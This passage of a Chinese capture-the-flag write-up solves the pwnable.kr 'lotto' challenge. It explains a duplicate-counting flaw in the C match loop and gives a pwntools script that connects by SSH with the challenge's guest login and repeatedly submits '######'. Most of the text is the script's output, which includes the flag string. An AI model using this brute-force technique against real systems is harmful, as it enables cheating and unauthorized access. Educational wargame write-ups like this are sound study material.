</span></span></code></pre></div><p>看这段:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span><span class=p>(</span><span class=n>j</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>j</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span><span class=p>(</span><span class=n>lotto</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=n>submit</span><span class=p>[</span><span class=n>j</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>                                <span class=n>match</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span></code></pre></div><p>原本应该是lotto和submit按顺序一一对应, 但是这段代码写成了对于lotto中的每一位, 只要submit中有x个与它相同就会使match+x. 这大大降低了枚举难度. 我们只要认死一个1~45中的字符, 比如&rsquo;#&rsquo;, 一直输入
&ldquo;######&rdquo;, 只要随机出的lotto中有一个#, 就可以让match+6, 从而得到flag.
不会写代码识别flag, 所以我只能人工盯着屏幕看了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>ssh</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;pwnable.kr&#39;</span><span class=p>,</span><span class=n>user</span><span class=o>=</span><span class=s1>&#39;lotto&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>2222</span><span class=p>,</span> <span class=n>password</span><span class=o>=</span><span class=s1>&#39;guest&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./lotto&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;######&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=c1># s.interactive()</span>
</span></span></code></pre></div><p>可以看到得到flag还是很快的, 看到flag就可以ctrl+c结束脚本了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>[+] Starting remote process bytearray(b&#39;./lotto&#39;) on pwnable.kr: pid 281220
</span></span><span class=line><span class=cl>/home/juicymio/mycode/lotto.py:5: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
</span></span><span class=line><span class=cl>  p.sendline(&#34;1&#34;)
</span></span><span class=line><span class=cl>/home/juicymio/mycode/lotto.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
</span></span><span class=line><span class=cl>  p.sendline(&#34;######&#34;)
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;sorry mom... I FORGOT to check duplicate numbers... :(\n&#39;  // 第一次出现flag在这
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;sorry mom... I FORGOT to check duplicate numbers... :(\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;sorry mom... I FORGOT to check duplicate numbers... :(\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;sorry mom... I FORGOT to check duplicate numbers... :(\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;sorry mom... I FORGOT to check duplicate numbers... :(\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
</span></span><span class=line><span class=cl>b&#39;2. Help\n&#39;
</span></span><span class=line><span class=cl>b&#39;3. Exit\n&#39;
</span></span><span class=line><span class=cl>b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class=line><span class=cl>b&#39;bad luck...\n&#39;
</span></span><span class=line><span class=cl>b&#39;- Select Menu -\n&#39;
</span></span><span class=line><span class=cl>b&#39;1. Play Lotto\n&#39;
